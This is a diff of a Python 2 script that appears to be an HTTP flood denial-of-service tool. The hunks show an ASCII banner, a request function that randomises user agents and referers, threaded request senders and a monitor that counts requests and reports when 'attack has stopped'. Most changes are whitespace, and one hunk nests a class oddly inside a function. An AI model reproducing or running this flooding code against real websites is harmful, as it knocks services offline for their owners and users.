@@ -884,10 +884,10 @@ print \
 8888888888 d8P  Y8b 888 888     "Y88b. d8P  Y8b d88P"    
 888    888 88888888 888 888       "888 88888888 888      
 888    888 Y8b.     888 888 Y88b  d88P Y8b.     Y88b.    
-888    888  "Y8888  888 888  "Y8888P"   "Y8888   "Y8888P 
-                                                       
+888    888  "Y8888  888 888  "Y8888P"   "Y8888   "Y8888P                                                     
 """
 #http request
+
 def httpcall(url):
 	useragent_list()
 	referer_list()
@@ -920,8 +920,8 @@ def httpcall(url):
 			urllib2.urlopen(request)
 	return(code)		
 
-	
 #http caller thread 
+
 	class HTTPThread(threading.Thread):
 		def run(self):
 			try:
@@ -931,12 +931,10 @@ def httpcall(url):
 					set_flag(2)
 				except Exception, ex:
 					pass
-
-
+				
 # monitors http threads and counts requests
 
 class MonitorThread(threading.Thread):
-	
 	def run(self):
 		previous=request_counter
 		while flag==0:
@@ -945,7 +943,6 @@ class MonitorThread(threading.Thread):
 				previous=request_counter
 		if flag==2:
 			print "\n[*] Killing the proccess, attack has stopped"
-
 #execute 
 
 if len(sys.argv) < 2:
